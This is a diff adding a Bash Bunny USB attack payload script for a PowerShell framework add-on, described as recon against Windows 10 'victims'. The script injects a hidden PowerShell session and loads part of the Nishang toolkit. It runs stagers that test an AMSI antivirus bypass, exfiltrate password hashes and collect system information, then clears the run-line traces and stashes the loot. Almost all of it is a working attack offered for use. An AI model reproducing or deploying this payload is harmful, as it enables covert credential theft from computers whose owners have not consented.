@@ -1,0 +1,60 @@
+#!/bin/bash
+############################################################################################
+#
+# Title:         Target Recon
+# Description:   Example recon payload for the Bashbunny Powershell Framework.  Bashbunny
+#                can be removed when the LED goes green.  Powershell scripts runs in a 
+#                hidden powershell window in unattended mode
+#
+#                3 scripts are run and 3 loot files are produced:
+#                  a) Check that the AMSI Bypass worked (at some stage defender will catch up)
+#                  b) Grab and exfiltrate of any password hashes using a function from nishang
+#                  c) Grab and exfiltrate a file of info about the target machine
+#                This part of the payload simply injects a powershell script onto the victim and shuts down
+#                It shows how simple the framework makes running hidden windows powershell admin payloads 
+# Author:        p3rki3
+# Props:		 samratashok (for nishang)
+# Version:       0.91
+# Dependencies:  bashbunny powershell framework extension, gohttp (for NET method only)
+# Category:      Recon
+# Target:        Windows 10 (Powershell) - may work on earlier versions, but untested
+# Attackmodes:   HID, Ethernet
+#
+
+# SLEEPTIME variable controls how quickly Invoke_Powershell runs - default is 1 for a modern machine; use larger numbers for older, slooooowwweeer PCs
+LED SETUP
+SLEEPTIME="2"
+
+# Start the Framework $1 = "NET" or "STORAGE"; $2 = "QUIET" or "VISIBLE" or empty (ie NOISY); $3 writes a debug trace to bbps.dbg if set to "ON"
+# The debug trace is very useful during payload development and testing to see where the payload gets to...
+INVOKE_POWERSHELL "NET" "QUIET" "OFF"
+sleep 1
+
+# Stage 1 - Load (part of) the Nishang Powerpreter module into Powershell and give it some time to process
+LED STAGE1
+INJECT_PSMODULE "Slimpreter.psm1"
+sleep 1
+
+# Stage 2 - Load and run our first stager script from the BB; checks if the AMSI Bypass worked and returns the result in a loot file called AMSIBypass.txt.
+LED STAGE2
+INJECT_PSSCRIPT "stage1.ps1" "AMSIBypass.txt"
+#sleep 1 - These post - Inject_PSScript sleeps are only needed if doing the storage method to attempt to keep BB and target PC in sync.
+
+# Stage 3 - Load and run our second stager script from the BB; exfil our loot into PassHashes.txt; this uses the module injected above
+LED STAGE3
+INJECT_PSSCRIPT "stage2.ps1" "PassHashes.txt"
+#sleep 3
+
+# Stage 4 - Load and run our third and last stager script from the BB; exfil our loot into ComputerInfo.txt
+LED STAGE4
+INJECT_PSSCRIPT "stage3.ps1" "ComputerInfo.txt"
+#sleep 6		#script takes a few seconds to run
+
+# Cleanup - close down powershell, clean up the windows run line and move to the loot from the switch folder to a proper loot folder under /loot/Win10Recon
+LED CLEANUP
+CLOSE_POWERSHELL
+STASH_LOOT "Win10Recon"
+
+# Complete the script, dial down the Bunny heating system and exit - when the light goes green, you are good to remove
+ATTACKMODE OFF
+LED FINISH
